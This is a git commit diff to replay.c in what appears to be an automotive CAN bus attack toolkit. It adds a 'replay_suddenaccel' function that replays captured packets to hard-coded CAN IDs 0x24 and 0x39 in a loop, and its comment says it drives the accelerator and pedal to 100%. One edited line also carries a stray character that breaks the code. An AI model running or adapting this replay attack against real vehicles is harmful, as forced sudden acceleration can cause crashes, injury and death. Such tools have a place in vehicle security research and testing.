f656ccc84ac74cf0a4b6f6d9a2de32ef70805a94
ChoChiMoo <eddyojh@gmail.com>
2024-11-07 01:15:37 +0900

    [feat]: add replay_suddenaccel in replay.c

--- tool/attack-functions/replay.c
+++ tool/attack-functions/replay.c
@@ -1,18 +1,31 @@
 #include "all_headers.h"
 
+/*================================================================
+replay.c
+This function replays CAN packets with or without payloads.
+
+functions:
+- replay_replay: replays CAN packets with payloads
+- replay_suddenaccel: replays CAN packets with payloads (accel 100% && pedal 100%)
+
+Parameters:
+- socket: CAN socket
+- addr: CAN address
+==================================================================*/
+
 void replay_replay(int socket, struct sockaddr_can *addr, int canid, int time_diff){
     do {
         send_can_packet(socket, addr, replay.payload1, replay.payload1_len, canid);
         send_can_packet(socket, addr, replay.payload2, replay.payload2_len, canid);
-        if (time_diff == 0) break;
+        if (time_diff == 0) break;ㄴ
         usleep(time_diff * 1000);
     } while (1);
 }
 
 void replay_suddenaccel(int socket, struct sockaddr_can *addr, int canid, int time_diff){
     do {
-        send_can_packet(socket, addr, replay.payload1, replay.payload1_len, canid);
-        send_can_packet(socket, addr, replay.payload2, replay.payload2_len, canid);
+        send_can_packet(socket, addr, replay.payload1, replay.payload1_len, 0x24);
+        send_can_packet(socket, addr, replay.payload2, replay.payload2_len, 0x39);
         if (time_diff == 0) break;
         usleep(time_diff * 1000);
     } while (1);
